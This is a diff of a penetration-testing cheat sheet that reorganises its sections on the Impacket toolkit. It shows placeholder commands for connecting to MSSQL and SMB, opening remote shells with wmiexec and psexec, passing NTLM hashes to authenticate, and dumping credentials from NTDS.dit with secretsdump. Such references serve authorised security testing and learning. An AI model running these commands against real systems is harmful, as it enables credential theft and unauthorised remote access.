@@ -27,9 +27,81 @@ $ pip install --user -r $DEST/requirements.txt
 $ pip install --user $DEST
 $ python $DEST/examples/secretsdump.py [...]
 ```
+
+📚 You can refer to [thehacker.recipes](https://tools.thehacker.recipes/impacket) for a list of scripts.
 </div></div>
 
 <hr class="sep-both">
+
+## Impacket Overview
+
+<div class="row row-cols-lg-2"><div>
+
+#### Impacket 'target' parameter
+
+Most scripts operating require a **target** such as `username@IP`. You can specify the password within the command.
+
+```shell!
+$ impacket-xxx username@IP
+$ impacket-xxx username:password@IP
+$ impacket-xxx username:password@IP -windows-auth
+```
+
+`-windows-auth` can be specified to indicate that we want to use local authentication <small>(`.\username`)</small> instead of Active Directory authentication.
+</div><div>
+</div></div>
+
+<hr class="sep-both">
+
+## Impacket Clients
+
+<div class="row row-cols-lg-2"><div>
+
+#### mssqlclient
+
+Connect to a MSSQL database.
+
+```shell!
+$ impacket-mssqlclient username@IP -windows-auth
+$ impacket-mssqlclient username:password@IP -windows-auth
+SQL> exit
+```
+
+#### smbclient
+
+Connect to a SMB server.
+
+```shell!
+$ impacket-smbclient 'username':'password'@IP
+$ impacket-smbclient IP
+smbclient> shares
+smbclient> use share_name
+smbclient> ls
+smbclient> tree
+```
+</div><div>
+
+#### wmiexec
+
+Pop a semi-interactive shell using [DCOM](/operating-systems/networking/protocols/dcom.md):
+
+```shell!
+$ impacket-wmiexec -shell-type powershell username:password@IP
+$ impacket-wmiexec -shell-type powershell username:password@IP "hostname"
+```
+
+#### psexec
+
+Pop a semi-interactive remote shell using RemComSvc.
+
+```shell!
+$ impacket-psexec -hashes lmhash:nthash username@IP
+$ impacket-psexec -hashes :nthash username@IP
+```
+</div></div>
+
+<hr class="sep-both">
+
 
 <div class="row row-cols-lg-2"><div>
 
@@ -42,29 +114,6 @@ List users and domains.
 ```shell!
 $ impacket-samrdump IP
 $ impacket-samrdump username:password@IP
-```
-
-<br>
-
-#### wmiexec
-
-Pop a powershell or run commands using [DCOM](/operating-systems/networking/protocols/dcom.md):
-
-```shell!
-$ impacket-wmiexec -shell-type powershell username:password@IP
-$ impacket-wmiexec -shell-type powershell username:password@IP "hostname"
-```
-
-<br>
-
-#### mssqlclient
-
-Connect to a MSSQL database.
-
-```shell!
-$ impacket-mssqlclient username@IP -windows-auth
-$ impacket-mssqlclient username:password@IP -windows-auth
-SQL> exit
 ```
 </div><div>
 
@@ -83,15 +132,6 @@ $ impacket-secretsdump -system ./system.hive -ntds ./ntds.dit LOCAL
 
 <br>
 
-#### PsExec
-
-Use a hash to login (Pass-The-Hash).
-
-```shell!
-$ impacket-psexec -hashes usernamehash:sessionhash username@IP
-$ impacket-psexec -hashes :hash username@IP
-```
-
 <br>
 
 #### SMB server
@@ -104,22 +144,6 @@ Run a [SMB](../smb.md) server to which user will connect with the username XXX a
 $ impacket-smbserver -smb2support -username XXX -password YYY share_name /path/to/share
 $ impacket-smbserver -smb2support -username username -password password share .
 $ impacket-smbserver -smb2support share_name /path/to/share
-```
-
-<br>
-
-#### SMB Client
-
-Alternative to `smbclient`. It works even when the former doesn't.
-
-```shell!
-$ impacket-smbclient 'username':'password'@IP
-$ impacket-smbclient IP
-# shares
-<list of shares>
-# use <sharename>
-# ls
-# tree
 ```
 </div></div>
 
